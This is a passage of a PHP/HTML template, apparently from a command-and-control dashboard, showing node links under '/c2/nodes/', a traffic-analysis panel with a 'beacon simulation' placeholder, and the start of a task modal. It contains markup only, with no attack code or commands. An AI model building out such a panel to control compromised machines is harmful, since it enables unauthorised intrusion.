                        <p><a href="/c2/nodes/<?= e($node) ?>/" style="color:#0f0;">→ Access Node</a></p>
                    </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>

        <?php elseif ($view === 'traffic'): ?>
        <div class="glass-panel">
            <h2>📊 Network Traffic Analysis</h2>
            <canvas id="trafficFullChart" style="height:300px;"></canvas>
            <p style="margin-top:20px;">Real‑time beacon simulation – coming soon.</p>
        </div>
        <?php endif; ?>
    </div>

    <!-- Task Modal -->
    <div id="taskModal" class="modal">
